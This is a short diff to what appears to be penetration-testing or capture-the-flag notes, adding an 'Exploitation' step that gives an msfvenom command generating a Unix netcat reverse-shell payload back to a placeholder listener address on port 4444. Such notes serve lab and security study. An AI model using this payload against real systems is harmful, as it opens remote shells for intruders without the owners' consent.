@@ -28,3 +28,5 @@ ssh username@IP
 ## EXPLOITATION
 
 Reverse Shell:\
+[obtain your lhost from the terminal using '''ifconfig''' or '''ip a'''\
+msfvenom -p cmd/unix/reverse_netcat lhost=xx.xx.xx.xx lport=4444 R
